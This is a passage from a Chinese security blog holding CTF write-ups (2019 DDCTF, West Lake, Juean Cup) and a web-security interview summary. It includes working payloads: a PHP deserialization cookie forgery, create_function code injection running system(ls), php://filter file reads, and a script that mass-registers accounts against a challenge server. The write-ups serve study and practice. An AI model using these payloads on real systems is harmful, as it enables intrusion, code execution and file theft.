<p>这里给了个 hint//eancrykey and flag under the folder，因此我们需要想办法读取../config/文件夹下的 flag。在Application类中的析构函数中，有一个file_get_contents()可供我们读取文件。其中的参数$path来自于Application类中的$path属性。而$path属性的初始值是空的。根据这里含有魔术方法__destruct()，并且后面有unserialize()函数，想到我们尝试可以通过 PHP 反序列化来修改$path的值。</p>
<p>构造pop链</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;    <span class="comment">// 需要修改的值</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$eancrykey = <span class="string">'EzblrbNS'</span>;    <span class="comment">// 设置 $eancrykey，用于签 Cookie</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$userdata = <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'session_id'</span> =&gt; <span class="keyword">new</span> Application(),      <span class="comment">// 在这里触发反序列化</span></span></span><br><span class="line"><span class="php">    <span class="string">'ip_address'</span> =&gt; <span class="string">'xxx.xxx.xxx.xxx'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'user_agent'</span> =&gt; <span class="string">'ua'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'user_data'</span> =&gt; <span class="string">''</span></span></span><br><span class="line"><span class="php">);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$cookiedata = serialize($userdata);</span></span><br><span class="line"><span class="php">$cookiedata = $cookiedata.md5($eancrykey.$cookiedata);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($cookiedata);</span></span><br></pre></td></tr></table></figure>
<p>ddctf_id = a:4:{s:10:”session_id”;O:11:”Application”:1:{s:4:”path”;s:21:”…/./config/flag.txt”;}s:10:”ip_address”;s:15:”xxx.xxx.xxx.xxx”;s:10:”user_agent”;s:2:”ua”;s:9:”user_data”;s:0:””;}4d7f704737a8721321d75d580eea9cb2</p>
<p>编码提交，得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2aapioo9rj311o0f8765.jpg" alt=""></p>
<h1 id="upload-img"><a href="#upload-img" class="headerlink" title="upload img"></a>upload img</h1><p> 考点 : GD库二次渲染</p>
<p> 上传一张图片，然后下载下来，发现和原来的图片发生了变化，上传正常图片都被处理过了<br> 需要注意的是无论上传什么图片都会被转化为 jpg，所以使用 jpg 来构造更好。<br> 直接脚本<br> <a href="https://github.com/BlackFan/jpg_payload" target="_blank" rel="noopener">https://github.com/BlackFan/jpg_payload</a></p>
<p> Usage: php jpg_payload.php &lt;jpg_name.jpg&gt;<br>用这个工具生成可以GD渲染处理后，依然能保留字符串的jpg，在py源码中把字符串改为phpinfo()，然后生成。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ah8lv0u4j30bt0680st.jpg" alt=""></p>
<h1 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h1><p> <img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ah9tu2v1j30rt0aaaad.jpg" alt=""></p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag获取函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下三个函数负责对参数进行解析。</span></span><br><span class="line"><span class="comment"># 1. 添加log，并将参数加入队列</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 工具函数，获取prefix与postfix之间的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span></span><span class="symbol">:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 从队列中取出函数，并分析后，进行执行。（稍后进行详细分析）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站入口点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 页面渲染，三个页面:index/shop/reset</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加钻石</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算价钱，进行减钱</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span></span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span></span></span><br></pre></td></tr></table></figure>
<h1 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h1><p> <img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2amsnq1xsj30sg0g5412.jpg" alt=""></p>
<p> 尝试sql注入  无果</p>
<p> 注册账号 登入 点击购买，支付   发现余额不足，查看页面 发现请求了这个页面<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2anbqd89hj311o0ii40a.jpg" alt=""></p>
<p>开始伪造价格，发现后端按范围是分别以32位和64位处理，因为64位最大整数+1报错，32位最大整数+1报错，然而其中间的某范围数不报错。经过测试发现提交32位最大整数*2+2到100的数就可买票，比如4294967296</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ani51fabj30y60bajrt.jpg" alt=""></p>
<p>进到游戏之后，可以通过提交正确id与ticket来移除对手，没什么好办法，经过一番尝试了解到id与ticket是固定对应的关系，只有写脚本通过暴力注册获取尽可能多的id，然后一一删除</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ao4dixo7j30en07w0sp.jpg" alt=""></p>
<p>然后批量注册小号批量买入场券批量拿id和token给大号淘汰</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    url1 = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=evoa0&#123;0&#125;&amp;password=xxxxxxxxxxxx"</span>.format(<span class="built_in">str</span>(i))</span><br><span class="line">    url2 = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=42949672961"</span></span><br><span class="line">    url3 = <span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span></span><br><span class="line">    url4 = <span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?ticket=&#123;0&#125;&amp;id=&#123;1&#125;"</span></span><br><span class="line">    rep1 = requests.<span class="built_in">get</span>(url1)</span><br><span class="line"></span><br><span class="line">    cook1name = rep1.cookies[<span class="string">"user_name"</span>]</span><br><span class="line">    cook1sess = rep1.cookies[<span class="string">"REVEL_SESSION"</span>]</span><br><span class="line">    urlcookies=&#123;<span class="string">"user_name"</span>:cook1name,<span class="string">"REVEL_SESSION"</span>:cook1sess&#125;</span><br><span class="line"></span><br><span class="line">    rep2 = requests.<span class="built_in">get</span>(url2,cookies=urlcookies)</span><br><span class="line">    billid = rep2.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">"bill_id"</span>]</span><br><span class="line"></span><br><span class="line">    rep3 = requests.<span class="built_in">get</span>(url3+billid,cookies=urlcookies)</span><br><span class="line">    userid = rep3.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">"your_id"</span>]</span><br><span class="line">    userticket = rep3.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">"your_ticket"</span>]</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    rep4 = requests.<span class="built_in">get</span>(url4.format(userticket,<span class="built_in">str</span>(userid)),cookies=&#123;<span class="string">"user_name"</span>:<span class="string">"evoA002"</span>,<span class="string">"REVEL_SESSION"</span>:<span class="string">"675dc6a259890db618c598e0cd9f9802"</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(url4.format(userticket,<span class="built_in">str</span>(userid)))</span><br><span class="line">    with <span class="built_in">open</span>(<span class="string">"chicken.txt"</span>,<span class="string">"a"</span>) as txt:</span><br><span class="line">        txt.write(<span class="built_in">str</span>(userid) + <span class="string">":"</span> +userticket)</span><br><span class="line">        txt.write(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ao8bm62yj30i507uaal.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/04/18/2019DDCTF-Writeup/" data-id="cjvrp4gl9002c5gqrq35ez1mi" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2019西湖论剑writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/11/2019西湖论剑writeup/" class="article-date">
  <time datetime="2019-04-11T11:16:41.000Z" itemprop="datePublished">2019-04-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/11/2019西湖论剑writeup/">2019西湖论剑writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h1><p>看到<code>include $_GET[&#39;file&#39;]</code>尝试文件包含用<code>php://filter</code>读取index文件,成功读取 解码得到如下:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$a) &#123;</span></span><br><span class="line"><span class="php">	$a = <span class="string">'./templates/index.html'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> $a;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--hint: ZGlyLnBocA== --&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>提示有dir.php 继续读取dir.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'dir'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$a)&#123;</span></span><br><span class="line"><span class="php">$a = <span class="string">'/tmp'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">var_dump(scandir($a));</span></span><br></pre></td></tr></table></figure></p>
<p>分析:<br>index.php<br>获取file值 检查是否出现flag<br>dir.php<br>列出目录结构</p>
<p>先在dir.php中查看目录<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yx9205u1j30wh0ioq3x.jpg" alt=""><br>然后在index.php中读取<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yx9q7wypj30vs08laac.jpg" alt=""><br>解码得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yxahyuwhj30um0fsmxk.jpg" alt=""></p>
<p># </p>
<p># </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/04/11/2019西湖论剑writeup/" data-id="cjvrp4ghx000a5gqridhlxhnw" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web安全相关面试总结" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/11/web安全相关面试总结/" class="article-date">
  <time datetime="2019-04-11T05:09:58.000Z" itemprop="datePublished">2019-04-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/11/web安全相关面试总结/">web安全相关面试总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>“如果一个人住，千万不要在下午时睡午觉，一觉睡到六七点等你一睁开眼，看着朦胧黑黑的天空，看着空荡的房间，会有一种被全世界遗弃的感觉，孤独在那一刻体现的淋漓尽致。”<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1ynhi655kj30k00k0wei.jpg" alt=""></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>收集和总结一些web安全面试可能会问到的问题，本文只是写个大概，提供一个方向，不会在某个问题讲太深，以下都是用本人通俗的话来讲，难免会有不正确的。</p>
<h1 id="基本漏洞讲解"><a href="#基本漏洞讲解" class="headerlink" title="基本漏洞讲解"></a>基本漏洞讲解</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><strong>原理:</strong><br>没有对输入生成的数据进行过滤或过滤不当，能够通过构造构造恶意的输入来改变sql语句的结构</p>
<p><strong>判断</strong><br>通过构造条件语句，来查看页面是否发生变化，例如:加单引号,加 2-1，sleep()验证</p>
<p><strong>注入类型</strong><br>get<br>post<br>cookie</p>
<p><strong>注入方式</strong><br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span>注入</span></span><br><span class="line">利用<span class="class"><span class="keyword">union</span> <span class="title">slect</span> 等等</span></span><br><span class="line"></span><br><span class="line">报错注入</span><br><span class="line">利用rand()+floor(),exp(),updatexml(),polygon()等等</span><br><span class="line"></span><br><span class="line">盲注(bool盲注和时间盲注)</span><br><span class="line">利用subtr(),<span class="keyword">if</span>(),ascii()等等、</span><br><span class="line"></span><br><span class="line">宽字节注入</span><br></pre></td></tr></table></figure></p>
<p><strong>防御</strong><br>·使用预编译语句<br>·关闭错误提示<br>·强制类型转换</p>
<h2 id="跨站脚本XSS"><a href="#跨站脚本XSS" class="headerlink" title="跨站脚本XSS"></a>跨站脚本XSS</h2><p><strong>原理</strong><br>向网页写入恶意脚本，当其他用户进行浏览时，就会触发恶意代码进行恶意操作</p>
<p><strong>类型</strong><br>反射性(一次性)<br>一般在url中构造恶意代码，发送给其他用户点击执行相关操作</p>
<p>存储型(永久性)<br>一般在进行表单提交，比如留言板，在表单提交恶意代码存到数据库，当其他用户浏览时会触发，影响大量用户</p>
<p>dom型(基于)<br>通过修改dom结构来操作dom对象进行注入</p>
<p><strong>防御</strong><br>·进行转义输出<br>·设置httponly(禁止js获取cookie值)</p>
<h2 id="csrf-夸站请求伪造"><a href="#csrf-夸站请求伪造" class="headerlink" title="csrf(夸站请求伪造)"></a>csrf(夸站请求伪造)</h2><p><strong>原理</strong><br>服务器没有对请求来源进行过滤验证而导致受害者执行攻击代码，一般是在恶意网站向其他网站执行了恶意操作</p>
<p><strong>判断</strong><br>抓取正常请求包，去掉referer重新提交，如果提交还有效，说明存在ssrf</p>
<p><strong>防御</strong><br>设置token(服务器生成一个随机给客户端，客户点携带随机数进行请求)<br>验证refere</p>
<h2 id="ssrf-服务端请求伪造"><a href="#ssrf-服务端请求伪造" class="headerlink" title="ssrf(服务端请求伪造)"></a>ssrf(服务端请求伪造)</h2><p><strong>原理</strong><br>没有对服务器请求的内容进行过滤造成可以从外网访问内网进行攻击</p>
<p><strong>判断</strong><br>在图片地址或者url中进行构造</p>
<p><strong>防御</strong><br>·禁用不需要的协议 类似于<code>file:// , gopher://, ftp://</code><br>·限制端口</p>
<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p><strong>原理</strong><br>当应用程序程序能够解析xml时，如果可以引用外部实体，可以通过构造恶意命令执行恶意操作，内网攻击，任意文件读取</p>
<p><strong>防御</strong><br>禁止对外部实体的访问<br>过滤xml数据</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p><strong>IIS</strong><br>XX.ASP目录下的问价会被当做asp文件执行<br>xx.asp;.jpg ;表示截止，不会解析;后面的内容  会被当做asp文件执行</p>
<p><strong>Apache</strong><br>文件名解析从右到左</p>
<p><strong>Nginx</strong><br>xx.jpg/.php 会被当做php执行<br>存在00截断</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><strong>原理</strong><br>过滤包含文件函数中的参数可控 可导致任意文件</p>
<p>本地包含: 包含文件的参数可控 在进行包含时没有进行过滤 导致的夸目录读取文件<br>远程包含: 用户的输入没有进行过滤 通过访问远程服务器下的shell文件</p>
<p><strong>包含方式</strong><br>包含上传文件<br>利用伪协议，php://input(写一句话),data://(执行命令),php://filter(读取文件内容)<br>包含日志文件<br>包含session<br><strong>防御</strong><br>设置allow_url_include,关闭allow_url_fopen<br>使用open_basedir进行限制包含<br>过滤包含文件函数中的参数</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>原理</strong><br>没有对文件的后缀名过滤或者可绕过从而上传危险文件</p>
<p><strong>防御</strong><br>禁止上传目录有执行命令权限<br>文件路径名+文件名写死</p>
<h1 id="面试常见问题"><a href="#面试常见问题" class="headerlink" title="面试常见问题"></a>面试常见问题</h1><p><strong>apache和nginx区别</strong><br>apache 性能高 模块多 更稳定 动静编译<br>nigix 轻量级 静态编译</p>
<p><strong>怎么判断是否同源</strong><br>如果 两个页面的 协议 端口号 和 域名 相同  则两个页面 同源</p>
<p><strong>php.ini的一些安全配置</strong><br>打开安全模式<br>关闭危险函数<br>关闭注册全局变量<br>关闭错误回显<br>限制活动目录<br>增加错误日志</p>
<p><strong>如何进行信息收集</strong><br>获取真实ip<br>敏感目录扫描<br>子域名爆破<br>端口扫描<br>c段扫描<br>cms识别<br>中间件版本</p>
<p><strong>myslq注入 5.0 以上和5.0 以下有什么区别</strong><br>5.0以下没有information_schema 这个表</p>
<p><strong>SSRF 和 CSRF 有什么区别</strong><br>SSRF 由服务器发起<br>CSRF 有客户端发起</p>
<p><strong>cookie 与session 的区别</strong><br>cookie 存在于本地<br>sesion 存在于服务器 返回一个ID 作为一个cookie</p>
<p><strong>响应码了解多少</strong><br>404 文件不存在不<br>403 禁止访问<br>500 服务器错误<br>302 重定向<br>401 请求未经授权</p>
<p><strong>常见端口号</strong><br>22 ssh<br>21 ftp<br>23 telnet<br>443 https</p>
<p><strong>七层模型结构</strong><br>应用层 http ftp  dns<br>表示层 进行 解码与编码 加密解密<br>会话层 验证用户  断点续传<br>传输层 tip udp 建立连接<br>网络层 ip 进行选路<br>数据链路层<br>物理层</p>
<p><strong>XSS 和 CSRF 的区别？</strong><br>XSS：跨站脚本攻击，注重的是脚本，一般来说，吃什么吐什么 有脚本的参与，黑客构造好各种各样功能的脚本让你来触发。</p>
<p>CSRF：跨站请求伪造，注重的是跨站，伪造，也就是说重点在借刀杀人 借你的手触发某些操作。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/04/11/web安全相关面试总结/" data-id="cjvrp4gkd001e5gqrfgbufoon" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2019年掘安杯writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/08/2019年掘安杯writeup/" class="article-date">
  <time datetime="2019-04-08T11:31:45.000Z" itemprop="datePublished">2019-04-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/08/2019年掘安杯writeup/">2019年掘安杯writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $action = $_GET[<span class="string">'action'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $arg = $_GET[<span class="string">'arg'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action))&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action($arg,<span class="string">''</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>这是P神代码审计的题目，但是被改动了参数的位置<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vguehe0fj30us0chwgc.jpg" alt=""><br>create_function注入分析：</p>
<p><a href="https://style-404.github.io/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/">https://style-404.github.io/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/</a><br>在这道题中，可控的是第二个参数 通过加上 ‘)’ 闭合来进行注入<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">action</span>=%5ccreate_function&amp;arg=)&#123;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vgxu71q7j30xc0e8go2.jpg" alt=""><br>接下只需改变phpinfo();代码进行注入即可<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="meta">%5ccreate_function</span>&amp;arg=)&#123;&#125;print_r(scandir(<span class="string">'../'</span>));/*</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh31m698j30rl0fct9d.jpg" alt=""><br>发现这道题没有想p神那道题一样禁用system()函数<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=)&#123;&#125;print_r(<span class="keyword">system</span>(<span class="keyword">ls</span>));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh2l1yc4j30py06r3yn.jpg" alt=""></p>
<p>接下来读取内容<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="meta">%5ccreate_function</span>&amp;arg=)&#123;&#125;print_r(include<span class="meta">%20Th1s_1S_F1a9_Hav3_Fun</span>);/*</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh7tb46lj30y90bp74q.jpg" alt=""></p>
<h1 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhbz8twbj30ks07vglt.jpg" alt=""><br>呆呆地点击下载 如果发现没有flag~<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhd1ml6rj30ik07wq33.jpg" alt=""><br>查看源码 发现有flag.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhej7juuj30lc07qt8p.jpg" alt=""><br>什么也没有 于是回过头看之前的源码 是否能够下载flag.php 或者是任意文件下载</p>
<p>下载flag.php成功 内容如下</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>); <span class="regexp">//</span>网页编码</span><br><span class="line">function encrypt($data, $key) &#123;</span><br><span class="line">	